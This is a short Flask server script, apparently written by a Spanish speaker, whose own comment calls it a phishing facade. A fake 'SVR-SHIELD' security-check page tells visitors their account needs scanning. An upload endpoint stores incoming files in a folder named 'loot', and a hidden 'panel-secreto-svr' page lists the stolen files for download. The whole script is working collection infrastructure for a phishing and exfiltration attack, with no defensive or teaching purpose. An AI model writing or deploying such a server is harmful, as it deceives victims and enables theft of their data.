from flask import Flask, request, send_from_directory, render_template_string
import os
import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'loot'
if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

# RESTAURAMOS LA FACHADA (Phishing / Trampa)
@app.route('/')
def home():
    return """
    <html>
    <body style='background:#000; color:#0f0; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;'>
        <div style='border:1px solid #0f0; padding:20px; text-align:center;'>
            <h2>SVR-SHIELD PROTOCOL</h2>
            <p>Escaneo de seguridad requerido para su cuenta.</p>
            <button onclick="alert('Iniciando descarga de certificado...')">VERIFICAR DISPOSITIVO</button>
        </div>
    </body>
    </html>
    """

@app.route('/svr_upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "ERR", 400
    file = request.files['file']
    filename = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}"
    file.save(os.path.join(UPLOAD_FOLDER, filename))
    return "OK", 200

@app.route('/panel-secreto-svr')
def panel():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    li_items = "".join([f"<li style='margin:10px 0;'><a href='/download/{f}' style='color:#0f0;'>[⬇️] {f}</a></li>" for f in files])
    return f"<html><body style='background:#000; color:#0f0; padding:30px;'><h2>🛰️ SVR-MATRIX DATABASE</h2><hr><ul>{li_items or 'Vacío.'}</ul></body></html>"

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
